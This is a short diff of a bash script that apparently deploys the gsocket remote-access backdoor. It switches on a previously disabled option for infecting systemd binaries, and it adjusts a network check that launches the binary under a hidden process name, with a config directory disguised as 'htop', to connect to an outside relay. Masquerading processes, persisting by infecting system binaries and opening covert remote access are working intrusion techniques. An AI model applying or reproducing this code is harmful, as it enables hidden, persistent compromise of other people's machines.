@@ -152,7 +152,7 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 # ~/.config/<NAME>
 CONFIG_DIR_NAME="htop"
 
-# GS_INFECT=1 # 2024-04-20 YANKED until bugfix
+GS_INFECT=1
 [[ -n $GS_NOINFECT ]] && unset GS_INFECT
 
 # systemd candidates for binary infection
@@ -1687,7 +1687,7 @@ test_network()
 	# 2. Exit=202 after n seconds. Firewalled/DNS?
 	# 3. Exit=203 if TCP to GSRN is refused.
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_READ_CONFIG=0 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_CONFIG_READ=0 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
